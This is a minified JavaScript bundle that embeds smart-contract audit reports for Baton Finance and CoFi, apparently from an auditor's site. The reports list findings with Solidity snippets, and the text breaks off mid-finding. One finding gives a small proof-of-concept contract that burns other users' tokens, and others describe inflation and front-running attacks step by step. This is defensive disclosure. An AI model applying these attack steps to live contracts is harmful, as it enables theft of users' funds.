"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[2121],{4227:function(e,n,t){t.d(n,{V:function(){return i}});var r=t(85893),a=t(67294);function i(e){let{children:n,onRef:t,...i}=e,o=a.useRef(null);return a.useEffect(()=>{t(o)},[o]),(0,r.jsx)("div",{ref:o,className:"relative h-full max-h-screen min-h-screen w-full flex-none overflow-y-auto border-r border-gray-150 bg-white dark:border-gray-800 dark:bg-gray-900 lg:w-80 lg:bg-gray-50 lg:dark:bg-gray-900 xl:w-96",...i,children:n})}},23297:function(e,n,t){t.d(n,{H:function(){return o}});var r=t(85893),a=t(41664),i=t.n(a);function o(e){let{title:n,description:t,byline:a,href:o,as:s,active:c,leadingAccessory:l,onClick:d}=e;return(0,r.jsxs)(i(),{href:o,as:s,onClick:d&&d,className:"flex space-x-3 border-b border-gray-100 py-3 px-3.5 text-sm dark:border-gray-900 lg:rounded-lg lg:border-none lg:py-2 ".concat(c?"bg-black dark:bg-gray-700":"sm:hover:bg-gray-200 sm:dark:hover:bg-gray-800"),children:[l&&(0,r.jsx)(r.Fragment,{children:l}),(0,r.jsxs)("div",{className:"flex flex-col justify-center space-y-1",children:[(0,r.jsx)("div",{className:"font-medium line-clamp-3 ".concat(c?"text-white":"text-gray-1000 dark:text-gray-100"),children:n}),t&&(0,r.jsx)("div",{className:"line-clamp-2 ".concat(c?"text-white text-opacity-80":"text-gray-1000 text-opacity-60 dark:text-white"),children:t}),a&&(0,r.jsx)("div",{className:"line-clamp-1 ".concat(c?"text-white text-opacity-60":"text-gray-1000 text-opacity-40 dark:text-white dark:text-opacity-60"),children:a})]})]})}t(67294)},19927:function(e,n,t){t.d(n,{T:function(){return i}});var r=t(85893),a=t(4846);function i(e){return function(n){return(0,r.jsx)(a.C,{pageProps:n.props,children:e(n)})}}},92977:function(e,n,t){t.d(n,{Q:function(){return f}});var r=t(85893),a=t(11163),i=t(67294);let o=[{title:"Baton Finance",slug:"baton",description:"Baton Launchpad offers a suite of features that can be configured and tuned by creators to maximize the fairness and amount of liquidity for their NFT. These features include refunds, staggered mints, locked liquidity, yield farming, and vesting. The following sections will explain how each of these features works. Each of the following features is optional and can be configured by the creator.",findings:5,createdAt:"2023-08-02T03:52:32.356Z",body:"---\r\n\r\n# Findings\r\n\r\n## Medium Risk\r\n\r\n### [M-1] Unbounded royalty rate in NFT Creation\r\n\r\n**Context:** [BatonLaunchpad.sol](https://github.com/baton-finance/baton-launchpad/blob/64444c7599568ca778099603a59ec86cf7965086/src/BatonLaunchpad.sol#L89-L98)\r\n\r\n**Impact:** If a user sets the royalty rate to 100% when creating an NFT, the original seller will not receive any proceeds when the NFT is sold in the secondary market.\r\n\r\n**Description:** The code snippet provided shows the mechanism for creating an NFT, specifically with a focus on the royalty rate. The vulnerability arises because there is no upper limit check on the royalty rate. As per the description, a user can set the royalty rate to 100%, implying that when the NFT is subsequently sold, the entire sale price would be taken as royalty, leaving the seller with no proceeds from the sale.\r\n\r\n```solidity\r\n  function create(CreateParams memory createParams, bytes32 salt) external returns (Nft nft) {\r\n        ...\r\n        nft.initialize(\r\n            ...\r\n>            createParams.royaltyRate,\r\n            ...\r\n        );\r\n    }\r\n```\r\n\r\n**Recommendation:** Implement a check to ensure the royalty rate is within acceptable limits, ideally less than 100%. This would ensure that the original seller receives at least a portion of the sale proceeds when the NFT is resold in the secondary market.\r\n\r\n### [M-2] Inconsistent Fee Rate Limitation\r\n\r\n**Context:** [BatonLaunchpad.sol](https://github.com/baton-finance/baton-launchpad/blob/64444c7599568ca778099603a59ec86cf7965086/src/BatonLaunchpad.sol#L89-L98)\r\n\r\n**Impact**\r\n\r\nThis inconsistency allows an owner to bypass the fee rate limitation set in the setFeeRate function by setting a fee rate higher than 10% at the time of contract deployment.\r\n\r\n**Description**\r\n\r\nIn the provided setFeeRate function from the BatonLaunchpad.sol file, there's an explicit check to ensure that the fee rate does not exceed 10%.\r\n\r\nWhen setting a fee rate, the owner is limited with a max fee rate of 10%.\r\n\r\n```solidity\r\n    /**\r\n     * @notice Sets the fee rate. The max fee rate is 10%.\r\n     * @param _feeRate The new fee rate to 1e18 of precision (1e18 == 100%).\r\n     */\r\n    function setFeeRate(uint256 _feeRate) external onlyOwner {\r\n        if (_feeRate > 0.1 * 1e18) revert FeeRateTooLarge();\r\n        feeRate = _feeRate;\r\n        emit SetFeeRate(_feeRate);\r\n    }\r\n\r\n```\r\n\r\nHowever, this check is not present in the contract's constructor. Thus, when deploying the contract, the owner can set a fee rate higher than the intended 10% limit, effectively circumventing the limitation imposed by the setFeeRate function.\r\n\r\n**Recommendation**\r\n\r\nEnsure consistency in fee rate limitations by implementing the same fee rate check in the contract's constructor. This will prevent the owner from setting a fee rate above the intended 10% limit during contract deployment.\r\n\r\n### [M-3] Refund Miscalculation Due to Inclusion of Free NFTs\r\n\r\n**Context:** [Nft.sol](https://github.com/baton-finance/baton-launchpad/blob/64444c7599568ca778099603a59ec86cf7965086/src/Nft.sol#L257-L258)\r\n\r\n**Impact:** The current implementation of the refund mechanism does not differentiate between paid and free NFT mints. As a result, users who have minted free NFTs could, under certain cirumstances receive a lower refund amount than what they are actually entitled to, causing potential monetary loss.\r\n\r\n**Description:** In the provided logic, when an NFT is minted and refunds are enabled, the totalMinted counter for an address gets incremented regardless of whether the NFT is free or paid.\r\n\r\n```solidity\r\n        if (_refundParams.mintEndTimestamp != 0) {\r\n            // track the total minted and available refunds for each account if refunds are enabled\r\n            _accounts[msg.sender].totalMinted += amount;\r\n            _accounts[msg.sender].availableRefund += category.price * amount;\r\n        }\r\n\r\n```\r\n\r\nWhen a refund is requested, the refund amount is calculated based on the number of NFTs held and the totalMinted counter, without accounting for the actual value of every individual NFT, but based on the total amount.\r\n\r\n```solidity\r\n        uint256 totalRefundAmount =\r\n            tokenIds.length * _accounts[msg.sender].availableRefund / _accounts[msg.sender].totalMinted;\r\n\r\n        _accounts[msg.sender].totalMinted -= uint128(tokenIds.length);\r\n        _accounts[msg.sender].availableRefund -= uint128(totalRefundAmount);\r\n```\r\n\r\nHowever, let's assume there are multiple categories and one of them is free, let's say:\r\n\r\n```\r\ncategories[0] = Nft.Category({price: 0 ether, supply: 10, merkleRoot: bytes32(0)});\r\ncategories[1] = Nft.Category({price: 1 ether, supply: 10, merkleRoot: bytes32(0)});\r\n```\r\n\r\nAmelie mints 3 free NFT's from `category[0]` and 5 paid NFT's from `categories[1]`. If, when the refund is available Amelie requests a refund - she should be entitled her 5 ETH back.\r\n\r\nLet's say Amelie gives away 2 of her free NFT's (`category[0]`).\r\n\r\nPlease, note that even though she has only **\"five paid NFT's\"**, her `totalMinted = 8`, because the function doesn't make a difference between free or paid mints.\r\n\r\nNow, if Amelie requests a refund and holds on 6 of her initially 8 NFT's, she would only be able to get back 3.7e18 (6 \\* 5e18 / 8) and the rest of the funds are lost unless she's able to reclaim any of the other NFT's.\r\n\r\n**Recommendation**\r\n\r\nAdjust the logic so that the totalMinted counter only increments when a paid NFT is minted. Specifically, add a conditional check to see if the category.price of the minted NFT is greater than 0 before incrementing the totalMinted counter. This will ensure that only paid mints contribute to the refund calculation, safeguarding users from potential monetary loss.\r\n\r\n## Low Risk\r\n\r\n### [L-1] Possibility of griefing when locking LP\r\n\r\n**Context:** [Nft.sol](https://github.com/baton-finance/baton-launchpad/blob/64444c7599568ca778099603a59ec86cf7965086/src/Nft.sol#L343)\r\n\r\n**Impact:** Malicious actors can exploit the current lockLp function to consistently front-run genuine locking transactions. While these attackers may not gain any direct benefits, their actions can cause monetary loss for honest users in the form of wasted gas and disrupt the protocol's operations by delaying the locking process.\r\n\r\n**Description**\r\n\r\nIn the provided lockLp function:\r\n\r\n```solidity\r\n function lockLp(uint32 amount, StolenNftFilterOracle.Message[] calldata messages) external {\r\n        ...\r\n        lockedLpSupply += amount;\r\n        if (lockedLpSupply > _lockLpParams.amount) revert InsufficientLpAmount();\r\n```\r\n\r\nThe process allows for incremental increases in the lockedLpSupply based on the amount parameter. If a malicious actor, like Noemi in the given example, continually front-runs genuine locking transactions with small amounts (e.g., 1 token), the honest user's transaction (like Amelie's) will be reverted due to the \"InsufficientLpAmount\" condition. Consequently, the honest user will lose the gas paid for the transaction, and the locking process will be delayed.\r\n\r\n**Recommendation**\r\n\r\nTo mitigate this vulnerability, consider implementing a batching mechanism that processes multiple lock requests in a single transaction, reducing the opportunities for front-running. Additionally, consider using flashbots, which would allow the transaction to be processed privately and avoid being front-run altogether. Adopting such strategies will ensure the protocol's resilience against malicious front-running tactics.\r\n\r\n## Informational\r\n\r\n### [I-1] Redundant event emission\r\n\r\n**Context:** [Nft.sol](https://github.com/baton-finance/baton-launchpad/blob/64444c7599568ca778099603a59ec86cf7965086/src/Nft.sol#L300)\r\n\r\n**Description**\r\n\r\nIn the provided refund function, if a user calls it with an empty array (tokenIds.length == 0), the function will still proceed without any side effects until it emits a refund event at the end. This can lead to false indications that a refund took place when, in reality, no tokens were refunded.\r\n\r\n```solidity\r\n function refund(uint256[] calldata tokenIds) external {\r\n        ...\r\n        emit Refund(msg.sender, tokenIds.length, totalRefundAmount);\r\n    }\r\n```\r\n\r\nThis behavior is misleading and could cause confusion or misinterpretation of contract events.\r\n",pdfLink:"https://github.com/bytes032/reports/blob/main/Baton.pdf"},{title:"CoFi",slug:"cofi",description:"**COFI Money** is on a mission to transform idle assets into fully composable, yield-bearing tokens, that actively work for you and accrue rewards. COFI Money provides a seamless, transparent, secure, compliant and non-custodial solution.",findings:16,createdAt:"2023-05-10T03:52:32.356Z",body:"\r\n---\r\n\r\n# Findings\r\n## Critical Risk\r\n\r\n\r\n### [C-1] Anyone can burn tokens of other users\r\n\r\n**Context:** [FiToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/FiToken.sol#L437-L440)\r\n\r\n**Impact:** This vulnerability allows arbitrary users to burn tokens from any account, potentially leading to unauthorized loss of assets.\r\n\r\n**Description:** Based on the provided code, it seems that anyone can call the `burn` function and specify any `account` address to burn tokens from. In a secure system, only the account holder should have the ability to burn their own tokens. This creates a vulnerability where malicious users can burn other users' tokens without their permission.\r\n\r\n```solidity\r\n    function burn(address account, uint256 amount) external {\r\n        require(!paused, 'FiToken: Token paused');\r\n        _burn(account, amount);\r\n    }\r\n```\r\n\r\nMy assumption is this code has been forked from [here](https://arbiscan.deth.net/address/0x2d715a14d0577964f9dd7956c9a369b26afa55dc), but in this scenario it's access control is limited only to the vault, whereas in the Cofi's context, anyone can call the function.\r\n\r\nHere's a simple Proof of Concept (PoC):\r\n\r\n```solidity\r\npragma solidity >=0.5.0 <0.8.0;\r\n\r\n\r\ncontract Attack {\r\n    FiToken public tokenContract;\r\n\r\n    constructor(YourTokenContract _tokenContract) public {\r\n        tokenContract = _tokenContract;\r\n    }\r\n\r\n    function burnTokens(address victim, uint256 amount) public {\r\n        tokenContract.burn(victim, amount);\r\n    }\r\n}\r\n\r\n```\r\n\r\nIn this PoC, we define a contract `Attack` that accepts the address of your token contract in its constructor. This contract has a function `burnTokens` that accepts an `address` and an `uint256` as parameters, representing the victim's address and the amount of tokens to burn, respectively.\r\n\r\nThis function simply calls the `burn` function of your token contract with the victim's address and the amount as parameters, effectively burning tokens from the victim's account without their consent.\r\n\r\n**Recommendation:** To circumvent this vulnerability, it is advisable to revise the `burn` function to only permit the transaction's sender (the `msg.sender`) to burn their own tokens. This ensures that only the token holder can burn their tokens, thwarting other users from burning tokens that they do not own.\r\n\r\n```solidity\r\nfunction burn(uint256 amount) external {\r\n    require(!paused, 'FiToken: Token paused');\r\n    _burn(msg.sender, amount);\r\n}\r\n```\r\n\r\nShould you wish to maintain the functionality of third-party account burns, consider introducing a separate function with restricted access control or implement similar functionality but through the use of signatures.\r\n\r\n\r\n### [C-2] SwapExactInputSingle lacks slippage control\r\n\r\n**Context:** [SwapRouterFacet.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/facets/SwapRouterFacet.sol#L38-L48)\r\n\r\n**Impact**\r\n\r\nThe current configuration of the `swapExactInputSingle` function in the `SwapRouterFacet` contract could lead to considerable financial losses due to a lack of slippage protection. This absence of slippage protection could open the door for price manipulation by MEV (Miner Extractable Value) bots, which could perform \"sandwich\" attacks to their advantage and the users' disadvantage.\r\n\r\n**Description**\r\n\r\nThe function `swapExactInputSingle` is meant for token swapping operations. In its current state, it sets the `amountOutMinimum` to 0, indicating no minimum limit on the tokens the transaction should yield. This absence of a lower limit exposes the transaction to potential manipulation. Adversaries could artificially inflate the price before the transaction, profit from it, and then quickly reverse their actions, leading to substantial losses.\r\n\r\n```solidity\r\n        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter\r\n            .ExactInputSingleParams({\r\n                tokenIn: tokenIn,\r\n                tokenOut: tokenOut,\r\n                fee: poolFee,\r\n                recipient: address(this),\r\n                deadline: block.timestamp,\r\n                amountIn: amountIn,\r\n                amountOutMinimum: 0,\r\n                sqrtPriceLimitX96: 0\r\n            });\r\n```\r\n\r\n\r\n**Recommendation**\r\n\r\nTo mitigate this vulnerability, it is recommended to include a parameter for `amountOutMinimum` in the `swapExactInputSingle` function. This parameter would specify the minimum number of tokens expected from the swap operation, providing a slippage protection mechanism and hindering any manipulative efforts by bots.\r\n\r\n```\r\n  function swapExactInputSingle(\r\n        uint256 amountIn,\r\n+        uint256 amountOutMinimum,\r\n        address tokenIn,\r\n        address tokenOut,\r\n        uint24  poolFee\r\n    )\r\n        external\r\n        returns (uint256 amountOut)\r\n    {\r\n        IERC20(tokenIn).approve(address(swapRouter), amountIn);\r\n\r\n        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter\r\n            .ExactInputSingleParams({\r\n                tokenIn: tokenIn,\r\n                tokenOut: tokenOut,\r\n                fee: poolFee,\r\n                recipient: address(this),\r\n                deadline: block.timestamp,\r\n                amountIn: amountIn,\r\n+                amountOutMinimum: amountOutMinimum,\r\n                sqrtPriceLimitX96: 0\r\n            });\r\n\r\n        amountOut = swapRouter.exactInputSingle(params);\r\n    }\r\n\r\n```\r\n\r\n\r\n\r\n### [C-3] Vault.sol is susceptible to inflation attack\r\n\r\n**Context:** [Vault.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/Vault.sol#L19-L22)\r\n\r\n**Impact:** The vulnerability allows an attacker to manipulate the rate curve of the vault, leading to rounding errors in the calculation of shares for depositors. This can result in depositors losing a significant portion or the entirety of their deposited assets. The effectiveness of the attack depends on the offset between the precision of shares and assets, with smaller offsets making the attack more profitable for the attacker.\r\n\r\n**Description:** The vulnerability arises due to the lack of a sufficient offset between the precision of shares and assets in the vault. The code description provides insights into the vulnerability but does not include any code blocks.\r\n\r\nThe attack can be summarized as follows:\r\n\r\n1.  The exchange rate of the vault is determined by the number of assets and shares held in the vault.\r\n2.  Depositing tokens results in the number of shares being rounded down, causing a loss of value for the depositor.\r\n3.  A malicious attacker can exploit this rounding error by donating assets to the vault, manipulating the rate curve to favor themselves.\r\n4.  By carefully depositing a small amount of tokens followed by a large \"donation\" to the vault, the attacker can shift the exchange rate, causing subsequent deposits to result in significantly fewer shares for depositors.\r\n5.  If the rounding error reduces the depositor's shares to 0, their entire deposit effectively becomes a donation to the vault, benefiting the attacker.\r\n6.  The attacker typically waits for a legitimate user to deposit into the vault and front-runs their transaction, executing the attack described above.\r\n\r\nThe vulnerability allows the attacker to steal a significant portion of deposited tokens, particularly when the offset between share and asset precision is minimal. The attack can be customized to target a specific fraction of a user's deposit, with the attacker's required commitment being equivalent to their potential earnings.\r\n\r\n**Recommendation:** It is strongly recommended to update the smart contract to the latest version provided by OpenZeppelin (OZ) where they have fixed this vulnerability. By using the latest version, you can ensure that the deposit function correctly calculates the shares and mitigates the risk of an inflation attack.\r\n\r\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.9.0-rc.0\r\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3979\r\n\r\n\r\n\r\n### [C-4] FiToShares and underlyingToFi  can be abused to steal user funds\r\n\r\n**Context** [SupplyFacet.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/facets/SupplyFacet.sol#L31-L70)\r\n\r\n**Impact**\r\n\r\nThis vulnerability allows an unauthorized user to execute the redeem operation in the `fiToShares` and `underlyingToFi` functions for any other whitelisted customer, potentially stealing their deposits, because the redeem operation in the `FiToken` contract skips the approval check and is executed directly, enabling an attacker to perform unauthorized redemptions.\r\n\r\n**Description**\r\n\r\n`underlyingToFi` allows conversion of a specified amount of underlying assets to a fiAsset, with the converted assets transferred from a given account to a recipient, ensuring that the minimum required amount of fiAssets (before fees) is received. It also verifies if minting is enabled for the specified fiAsset and captures any applicable minting fees, transferring them to a fee collector address. Finally, it mints the resulting fiAssets and transfers them to the recipient.\r\n\r\n```solidity\r\n    function underlyingToFi(\r\n        uint256 amount,\r\n        uint256 minAmountOut, // E.g., 1,000 * 0.9975 = 997.50. Auto-set to 0.25%.\r\n        address fiAsset,\r\n        address depositFrom,\r\n        address recipient\r\n    )\r\n        external\r\n        isWhitelisted\r\n        minDeposit(amount, fiAsset) // -> 0\r\n        returns (uint256 mintAfterFee)\r\n    {\r\n        require(\r\n            LibToken._isMintEnabled(fiAsset) == 1,\r\n            'SupplyFacet: Mint for token disabled'\r\n        );\r\n\r\n        uint256 assets = LibVault._getAssets(\r\n            // Add permit for Vault transfer.\r\n            LibVault._wrap(\r\n                amount,\r\n                s.vault[fiAsset],\r\n                depositFrom\r\n            ),\r\n            s.vault[fiAsset]\r\n        );\r\n\r\n        require(assets >= minAmountOut, 'SupplyFacet: Slippage exceeded');\r\n\r\n        uint256 fee = LibToken._getMintFee(fiAsset, assets);\r\n        mintAfterFee = assets - fee;\r\n\r\n        // Capture mint fee in fiAssets.\r\n        if (fee > 0) {\r\n            LibToken._mint(fiAsset, s.feeCollector, fee);\r\n            emit LibToken.MintFeeCaptured(fiAsset, fee);\r\n        }\r\n\r\n        LibToken._mint(fiAsset, recipient, mintAfterFee);\r\n    }\r\n```\r\n\r\nOn the other hand, `fiToShares` allows the redemption of a specified amount of fiAssets to their corresponding collateral yieldAsset, transferring the redeemed yieldAssets to a recipient while ensuring the minimum required amount of yieldAssets (after fees) is received. It verifies if redemption is enabled for the specified fiAsset, calculates and captures any applicable redemption fees, and transfers the remaining fiAssets to a fee collector address. Finally, it converts the redeemed fiAssets into yieldAssets (shares) based on the corresponding vault ratio and transfers them to the recipient.\r\n\r\n```solidity\r\n function fiToShares(\r\n        uint256 amount,\r\n        uint256 minAmountOut,\r\n        address fiAsset,\r\n        address depositFrom,\r\n        address recipient\r\n    )   external\r\n        isWhitelisted\r\n        minWithdraw(amount, fiAsset)\r\n        returns (uint256 burnAfterFee)\r\n    {\r\n        require(\r\n            LibToken._isRedeemEnabled(fiAsset) == 1,\r\n            'SupplyFacet: Redeem for token disabled'\r\n        );\r\n\r\n        // Redeem operation in FiToken contract skips approval check.\r\n        LibToken._redeem(fiAsset, depositFrom, amount);\r\n\r\n        uint256 fee = LibToken._getRedeemFee(fiAsset, amount);\r\n        burnAfterFee = amount - fee;\r\n\r\n        // Redemption fee is captured by retaining 'fee' amount.\r\n        LibToken._burn(fiAsset, s.feeCollector, burnAfterFee);\r\n        if (fee > 0) {\r\n            emit LibToken.RedeemFeeCaptured(fiAsset, fee);\r\n        }\r\n\r\n        uint256 shares = LibVault._getShares(burnAfterFee, s.vault[fiAsset]);\r\n        require(shares >= minAmountOut, 'SupplyFacet: Slippage exceeded');\r\n\r\n        LibToken._transfer(s.vault[fiAsset], shares, recipient);\r\n    }\r\n```\r\n\r\nIf a user want's to call both functions, he needs to be whitelisted. To get whitelisted, the user has to go through a KYC process. Once that successfully executes the protocol whitelists their address\r\n\r\nThe KYC works by having the user sign a tx to confirm they are the wallet owner. Then routed to the protocol's KYC provider Sumsub who does the check. Upon successful response a webhook triggers that executes toggleWhitelist().\r\n\r\nThe issue here lies that as noted in both functions, the redeem operation in FiToken skips the approval check and is executed directly.\r\n\r\n```solidity\r\n    function _redeem(\r\n        address fiAsset,\r\n        address from,\r\n        uint256 amount\r\n    ) internal {\r\n        AppStorage storage s = LibAppStorage.diamondStorage();\r\n\r\n        IFiToken(fiAsset).redeem(from, s.feeCollector, amount);\r\n    }\r\n```\r\n\r\nThis means, a whitelisted user can call `fiToShares` and `underlyingToFi` for **any other** whitelisted customer and steal their deposit without their consent.\r\n\r\n**Recommendation**\r\n\r\nTo mitigate this vulnerability, it is recommended to refactor the `fiToShares` and `underlyingToFi` functions to redeem from the `msg.sender` instead of `depositFrom`. By redeeming from the `msg.sender`, the execution will be limited to the authorized user who initiated the transaction. If the protocol intends to enable third-party redeeming, it should implement a mechanism that uses signatures to validate the authorization, in addition to the existing KYC process.\r\n\r\nImplementing these changes will ensure that the redeem operation can only be executed by the authorized user and prevent unauthorized access to other users' deposits.\r\n\r\n\r\n## High Risk\r\n\r\n\r\n### [H-1] Missing expiration deadline in swap functions can lead to unfavorable prices and financial losses\r\n\r\n**Context:** [SwapRouterFacet.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/facets/SwapRouterFacet.sol#L17)\r\n\r\n**Impact**\r\n\r\nThe current implementation of the swap functions in the given code snippets does not provide an effective expiration deadline mechanism for transactions. This absence of a proper deadline could lead to transactions remaining unexecuted in the mempool for extended periods, potentially resulting in unfavorable prices for users and exposing them to financial losses.\r\n\r\n**Description**\r\n\r\nThe `ISwapRouter.ExactOutputSingleParams` and `ISwapRouter.ExactInputSingleParams` configurations in the provided code set the deadline parameter to `block.timestamp`. This approach does not offer adequate protection, as a validator can hold the transaction, and the block it is eventually put into will have a `block.timestamp` value, rendering the deadline ineffective.\r\n\r\nAutomated Market Makers (AMMs) and other advanced protocols often allow users to set a deadline parameter to enforce a time limit for transaction execution. Without a proper deadline, the transaction could linger in the mempool and be executed at a much later time, potentially resulting in a worse price for the user. [1](https://github.com/sherlock-audit/2023-01-ajna-judging/issues/39), [2](https://code4rena.com/reports/2022-11-paraspace/#m-13-interactions-with-amms-do-not-use-deadlines-for-operations)\r\n\r\n\r\n```solidity\r\n\r\n        ISwapRouter.ExactOutputSingleParams memory params = ISwapRouter\r\n            .ExactOutputSingleParams({\r\n                tokenIn: tokenIn,\r\n                tokenOut: tokenOut,\r\n                fee: poolFee,\r\n                recipient: address(this),\r\n                deadline: block.timestamp,\r\n                amountOut: amountOut,\r\n                amountInMaximum: amountInMaximum,\r\n                sqrtPriceLimitX96: 0\r\n            });\r\n```\r\n\r\n```solidity\r\n     ISwapRouter.ExactInputSingleParams memory params = ISwapRouter\r\n            .ExactInputSingleParams({\r\n                tokenIn: tokenIn,\r\n                tokenOut: tokenOut,\r\n                fee: poolFee,\r\n                recipient: address(this),\r\n                deadline: block.timestamp,\r\n                amountIn: amountIn,\r\n                amountOutMinimum: 0,\r\n                sqrtPriceLimitX96: 0\r\n            });\r\n```\r\n\r\n\r\n**Recommendation**\r\n\r\nIt is recommended to modify the protocol to allow users interacting with AMMs to set expiration deadlines. This change would provide better protection against transaction delays and help prevent potential financial losses due to unfavorable execution prices.\r\n\r\nTo implement this recommendation, consider updating the code as follows:\r\n\r\n1.  Add a user-specified `uint256 deadline` parameter to the functions that involve AMM interactions.\r\n2.  Replace the current `block.timestamp` values in the `ISwapRouter.ExactOutputSingleParams` and `ISwapRouter.ExactInputSingleParams` configurations with the new `deadline` parameter.\r\n\r\nAfter making these modifications, thoroughly test the updated code to ensure that it works as intended and that no additional vulnerabilities or unintended side effects are introduced.\r\n\r\n\r\n\r\n### [H-2] Missing token transfer functions in swapUsdcForDai and swapDaiForUsdc in MakerRouterFacet.sol\r\n\r\n**Context:** [MakerRouterFacet.sol](https://github.dev/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/facets/MakerRouterFacet.sol#L40-L73)\r\n\r\n**Impact**:\r\n\r\n The absence of token transfer functions in the `swapUsdcForDai` and `swapDaiForUsdc` functions can lead to potential vulnerabilities and unintended behavior. Tokens received or generated during the swapping process are not properly handled, potentially resulting in loss of funds or incorrect token balances.\r\n\r\n**Description**:\r\n\r\n In the provided code snippet, the `swapUsdcForDai` and `swapDaiForUsdc` functions have comments indicating that the corresponding tokens should be transferred to the specified vault. However, no actual token transfer functions are implemented, and the comments themselves do not have any impact on the execution of the code.\r\n\r\nAs a result, any tokens received or generated during the swapping process are not being transferred to the intended vault or any other designated address. This can lead to a situation where tokens remain in the contract's address, which can cause confusion, loss of funds, or inconsistent token balances.\r\n\r\n**Recommendation**:\r\n\r\nTo address this vulnerability, you should implement the necessary token transfer functions within the `swapUsdcForDai` and `swapDaiForUsdc` functions. Below is an example of how you can modify the code to include the token transfers:\r\n\r\n```solidity\r\nfunction swapUsdcForDai(uint256 amountUsdcIn) external onlyAdmin {\r\n    require(daiPSM.tin() == 0, \"MakerRouter: maker fee not 0\");\r\n\r\n    // First ensure USDC resides in this address.\r\n    USDC.safeApprove(GEM_JOIN, amountUsdcIn); /// approve DAI PSM to spend USDC\r\n    daiPSM.sellGem(address(this), amountUsdcIn); /// sell USDC for DAI\r\n    // Deploy DAI to new Vault.\r\n    DAI.transfer(address(newVault), DAI.balanceOf(address(this))); // Transfer DAI to new vault\r\n}\r\n```\r\n\r\n```solidity\r\nfunction swapDaiForUsdc(uint256 amountDaiIn) external onlyAdmin {\r\n    require(daiPSM.tout() == 0, \"MakerRouter: maker fee not 0\");\r\n\r\n    // First ensure USDC resides in this address.\r\n    DAI.safeApprove(address(daiPSM), amountDaiIn); /// approve DAI PSM to spend DAI\r\n    daiPSM.buyGem(address(this), amountDaiIn / USDC_SCALING_FACTOR); /// sell DAI for USDC\r\n    // Deploy USDC to new Vault.\r\n    USDC.transfer(address(newVault), USDC.balanceOf(address(this))); // Transfer USDC to new vault\r\n}\r\n\r\n```\r\n\r\n\r\n\r\n### [H-3] Incorrect storage check in _isRedeemEnabled\r\n\r\n**Context:** [LibToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/diamond/libs/LibToken.sol#L190-L196)\r\n\r\n**Impact**\r\n\r\nThe impact of this vulnerability is that the `_isRedeemEnabled` function is checking the wrong storage variable, which may lead to incorrect behavior when determining if redeeming is enabled for a specific `fiAsset`. This can potentially result in unintended consequences and erroneous decisions based on the incorrect information.\r\n\r\n**Description**\r\n\r\nThe `_isRedeemEnabled` function in the provided code snippet is designed to access the storage and determine whether redeeming is enabled for a particular `fiAsset`. However, instead of checking the correct storage variable `s.redeemEnabled`, the function erroneously checks `s.mintEnabled`. This incorrect check may produce misleading results, as it retrieves the value associated with `fiAsset` from the wrong storage mapping.\r\n\r\n```solidity\r\nfunction _isRedeemEnabled(address fiAsset) internal view returns (uint8) {\r\n    AppStorage storage s = LibAppStorage.diamondStorage();\r\n\r\n    return s.mintEnabled[fiAsset];\r\n}\r\n```\r\n\r\n**Recommendation**\r\n\r\nTo address this vulnerability, it is recommended to modify the code in the `_isRedeemEnabled` function to check the correct storage variable, `s.redeemEnabled`, for determining redeeming status. The code should be updated as follows:\r\n\r\n```solidity\r\nfunction _isRedeemEnabled(address fiAsset) internal view returns (uint8) {\r\n    AppStorage storage s = LibAppStorage.diamondStorage();\r\n\r\n    return s.redeemEnabled[fiAsset];\r\n}\r\n```\r\n\r\n\r\n## Medium Risk\r\n\r\n\r\n### [M-1] TransferFrom uses allowance even if spender == from\r\n\r\n**Context:** [FiToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/FiToken.sol#L222)\r\n\r\n**Impact:** The vulnerability in `transferFrom` function can lead to tokens becoming irreversibly stranded across different protocols. It breaks compatibility with a significant number of protocols that exclusively rely on the `transferFrom` method for token transfers (pull-only approach) instead of using both `transfer` and `transferFrom` (push and pull).\r\n\r\n\r\n**Description:** The `transferFrom` function in `FiToken` attempts to use the allowance even when the `spender` is the same as the `from` address. Consequently, the tokens involved in such transactions may become irreversibly stranded across different protocols due to the inconsistency in behavior.\r\n\r\nHere is the relevant code block demonstrating the vulnerability:\r\n```solidity\r\n    require(!frozen[_from], 'FiToken: Sender account is frozen');\r\n        require(!frozen[_to], 'FiToken: Recipient account is frozen');\r\n\r\n        _allowances[_from][msg.sender] = _allowances[_from][msg.sender].sub(\r\n            _value\r\n        );\r\n\r\n        _executeTransfer(_from, _to, _value);\r\n```\r\n\r\n**Recommendation:** To mitigate this vulnerability and ensure compatibility with other protocols, it is recommended to adjust the behavior of the `transferFrom` function by modifying the code block to include an additional condition to check if `spender` is equal to `from`:\r\n\r\n```solidity\r\n    if (_from != msg.sender) {\r\n        _allowances[_from][msg.sender] = _allowances[_from][msg.sender].sub(\r\n            _value\r\n            );\r\n    }\r\n```\r\n\r\n\r\n\r\n### [M-2] Unrestricted address opt-in vulnerability\r\n\r\n**Context:** [FiToken.sol](https://github.com/sgoodenough95/cofi-ethereum/blob/1418c28096623cd74731a97f8c4ec3409dca57cd/contracts/token/FiToken.sol#L580)\r\n\r\n**Impact:** The lack of access control in the FiToken.rebaseOptInExternal function allows anyone to opt in addresses on behalf of other users without their consent. This poses a significant security risk and violates the principle of user autonomy and control over their own accounts.\r\n\r\n**Description:** The FiToken.rebaseOptInExternal function, as currently implemented, lacks any access control mechanism. This means that any user can invoke the function and opt in an address of their choice, even if they do not have the authorization to do so. This unrestricted access can lead to unauthorized opt-ins and potential misuse of other 